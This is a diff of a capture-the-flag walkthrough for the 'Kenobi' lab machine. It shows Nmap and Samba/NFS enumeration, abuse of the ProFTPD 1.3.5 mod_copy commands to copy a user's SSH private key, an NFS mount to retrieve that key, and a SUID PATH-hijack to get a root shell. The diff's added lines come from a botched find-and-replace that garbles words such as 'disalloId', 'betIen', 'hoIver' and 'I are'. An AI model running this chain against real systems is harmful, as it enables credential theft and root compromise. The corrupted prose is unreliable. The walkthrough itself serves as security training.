@@ -3,7 +3,7 @@ This room will cover accessing a Samba share, manipulating a vulnerable version 
 
 ## Recon
 
-As always we start with [[Nmap]] to scan the machine and here are the results:
+As always I start with [[Nmap]] to scan the machine and here are the results:
 
 ```
 21/tcp   open  ftp         ProFTPD 1.3.5
@@ -13,7 +13,7 @@ As always we start with [[Nmap]] to scan the machine and here are the results:
 |   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
 |_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (EdDSA)
 80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
-| http-robots.txt: 1 disallowed entry 
+| http-robots.txt: 1 disalloId entry 
 |_/admin.html
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Site doesn't have a title (text/html).
@@ -45,7 +45,7 @@ Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 So lots of information. Did some research online about 111,139,445,2049 because I haven't seen them before and here is what I found out.
 
 - port 111 : tcp,udp - SunRPC 
-	Provides information between Unix based systems. Port is often probed, it can be used to fingerprint the Nix OS, and to obtain information about available services. Port used with NFS, NIS, or any rpc-based service.
+	Provides information betIen Unix based systems. Port is often probed, it can be used to fingerprint the Nix OS, and to obtain information about available services. Port used with NFS, NIS, or any rpc-based service.
 - port 139 : tcp,udp -netbios-ss 
 	NetBIOS is a protocol used for File and Print Sharing under all current versions of Windows. While this in itself is not a problem, the way that the protocol is implemented can be. There are a number of vulnerabilities associated with leaving this port open.
 - port 445 : tcp - microsoft-ds
@@ -56,11 +56,11 @@ So lots of information. Did some research online about 111,139,445,2049 because 
 
 ## Enumerating Samba for shares
 
-We are going to focus on Samba on this machine.
+I are going to focus on Samba on this machine.
 
 *Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.
 
-*Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.*
+*Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they Ire part of the same network.*
 
 The room gives us the command to enumarate the shares of the samba share with :
 `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.16.149`
@@ -99,22 +99,22 @@ Host script results:
 |_    Current user access: <none>
 ```
 
-So we see three shares, one called anonymous which sounds promising.
+So I see three shares, one called anonymous which sounds promising.
 Lets try to connect with:
 `anosmbclient //[ip]/anonymous`
-Pressing enter on the password and we are in!
-We can't do much on this terminal (can't cat the file) and so we are going to download this share on our local machine with:
+Pressing enter on the password and I am in!
+I can't do much on this terminal (can't cat the file) and so I am going to download this share on our local machine with:
 `smbclient //[ip]/anonymous`
-And now we can cat the log.txt file that we got from the share.
+And now I can cat the log.txt file that I got from the share.
 
 
-Next we are going to target that 111 port.
+Next I am going to target that 111 port.
 
 *Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. *
 
-We enumerate it like so:
+I enumerate it like so:
 `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.16.149`
-and we get:
+and I get:
 ```
 PORT    STATE SERVICE
 111/tcp open  rpcbind
@@ -144,41 +144,41 @@ MAC Address: 02:A4:95:01:54:C9 (Unknown)
 
 *ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.*
 
-We are going to use [[Introductory Networking#Netcat]] to connect to the port 21 with:
+I am going to use [[Introductory Networking#Netcat]] to connect to the port 21 with:
 `nc [ip] [port /21]`
-We get the version and now we search for vulnerabilites for this version with:
+I get the version and now I search for vulnerabilites for this version with:
 `searchploit ProFTPd 1.3.5`
-And we find 5 of them.
+And I find 5 of them.
 
 *You should have found an exploit from ProFtpd's [mod_copy module](http://www.proftpd.org/docs/contrib/mod_copy.html). 
 The mod_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
-We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.
+I know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.
 
-We are going to use those 2 commands to steal the id_rsa. So inside the opened connection we 
+I am going to use those 2 commands to steal the id_rsa. So inside the opened connection I 
 `SITE CPFR /home/kenobi/.ssh/id_rsa` and
 `SITE CPTO /var/tmp/id_rsa`  
 
-Now we have to mount the /var folder and we do it like so:
+Now I have to mount the /var folder and I do it like so:
 ```
 mkdir /mnt/kenobiNFS  
 mount [ip]:/var /mnt/kenobiNFS  
 ls -la /mnt/kenobiNFS
 ```
 
-We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.
-To connect to the machine we :
+I now have a network mount on our deployed machine! I can go to /var/tmp and get the private key then login to Kenobi's account.
+To connect to the machine I :
 ```
 cp /mnt/kenobiNFS/tmp/id_rsa .
 sudo chmod 600 id_rsa 
 ssh -i id_rsa kenobi@[ip]
 ```
 
-And we are in and get a flag!
+And I am in and get a flag!
 ## Privilege Escalation with Path Variable Manipulation
 
 ![](https://i.imgur.com/LN2uOCJ.png)
 
-SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.
+SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), hoIver other custom files could that have the SUID bit can lead to all sorts of issues.
 
 To search the a system for these type of files run the following: 
 `find / -perm -u=s -type f 2>/dev/null`
@@ -191,7 +191,7 @@ So /usr/bin/menu looks promising. I run it and I got :
 ** Enter your choice :
 ```
 
-Next we :
+Next I :
 
 ```
 echo /bin/sh > curl
@@ -200,5 +200,5 @@ export PATH=/tmp:$PATH
 /usr/bin/menu
 ```
 
-We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!
-And we get our final flag!
+I copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as Ill as this file being run as root it runs our shell as root!
+And I get our final flag!
